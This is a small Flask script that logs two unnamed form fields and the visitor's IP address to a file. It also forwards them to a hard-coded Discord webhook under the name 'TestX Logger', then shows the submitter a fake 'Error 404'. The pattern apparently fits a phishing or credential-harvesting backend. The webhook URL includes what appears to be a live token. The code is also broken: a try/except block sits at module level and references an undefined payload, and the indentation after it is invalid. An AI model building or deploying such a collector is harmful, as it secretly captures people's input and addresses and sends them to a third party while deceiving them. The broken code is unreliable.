from flask import Flask, request, render_template
from datetime import datetime
import requests
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1461953742013468673/doZ1FYwNPxdrsnh6c60ng1__tf_FPM-d1jznCDu4KsqemO8zwE1sScCV5e96rSPj1pq9"


app = Flask(__name__)
LOG_FILE = "submissions.txt"

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/submit', methods=['POST'])
def submit():
    t1 = request.form.get("text1", "").strip()
    t2 = request.form.get("text2", "").strip()

    if not t1 and not t2:
        return "Empty", 400

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{now}] {ip} | {t1} | {t2}\n")

    payload = {
    "username": "TestX Logger",
    "embeds": [
        {
            "title": "📩 New Submission",
            "color": 5793266,
            "fields": [
                {"name": "🕒 Time", "value": now, "inline": False},
                {"name": "🌐 IP", "value": ip, "inline": False},
                {"name": "✏️ Text 1", "value": t1 or "—", "inline": False},
                {"name": "✏️ Text 2", "value": t2 or "—", "inline": False},
            ]
        }
    ]
}

try:
    requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
except:
    pass

    print("="*50)
    print(now, ip)
    print(t1)
    print(t2)
    print("="*50)

    return "Error 404"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
